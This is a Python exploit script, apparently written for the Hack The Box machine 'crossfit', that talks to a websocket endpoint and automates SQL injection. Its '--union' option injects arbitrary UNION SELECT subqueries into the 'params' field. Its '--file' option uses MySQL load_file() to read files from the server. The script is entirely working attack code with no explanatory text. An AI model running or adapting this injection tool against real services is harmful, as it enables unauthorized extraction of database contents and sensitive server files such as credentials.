import argparse
import sys
import websockets
import asyncio
import json

url = "ws://gym.crossfit.htb/ws/"
parser = argparse.ArgumentParser()
parser.add_argument('-m', '--message', help='Send command')
parser.add_argument('-p', '--params', help='"params" parameter value')
parser.add_argument('-u', '--union', action='store_true', help='Enable UNION injection')
parser.add_argument('-f', '--file', action='store_true', help='Enable file reading')
args = parser.parse_args()


async def lets_talk():
    async with websockets.connect(url) as ws:
        msg = await ws.recv()
        json_data = json.loads(msg)
        payload = json.dumps({"message": "help", "token": json_data["token"]})
        if args.message:
            payload = json.dumps({"message": args.message, "token": json_data["token"]})
        elif args.params:
            if args.union:
                payload = json.dumps({"message": "available", "params": f"3 UNION SELECT ({args.params}),2", "token": json_data["token"]})
                # print(f"< {payload}")
                await ws.send(payload)
                msg = await ws.recv()
                json_data = json.loads(msg)
                rspn = json_data["debug"][5:-9].replace(',', '\n')
                print(rspn)
                exit(0)
            elif args.file:
                payload = json.dumps({"message": "available", "params": f"3 UNION SELECT (select load_file('{args.params}')),2", "token": json_data["token"]})
                # print(f"< {payload}")
                await ws.send(payload)
                msg = await ws.recv()
                json_data = json.loads(msg)
                rspn = json_data["debug"][5:-10]
                print(rspn)
                exit(0)
            else:
                payload = json.dumps({"message": "available", "params": args.params, "token": json_data["token"]})
        print(f"< {payload}")
        await ws.send(payload)
        msg = await ws.recv()
        print(f"> {msg}")

if __name__ == "__main__":
    try:
        if len(sys.argv) == 1:
            parser.print_help()
        else:
            asyncio.get_event_loop().run_until_complete(lets_talk())
    except KeyboardInterrupt:
        print(' KeyboardInterrupt')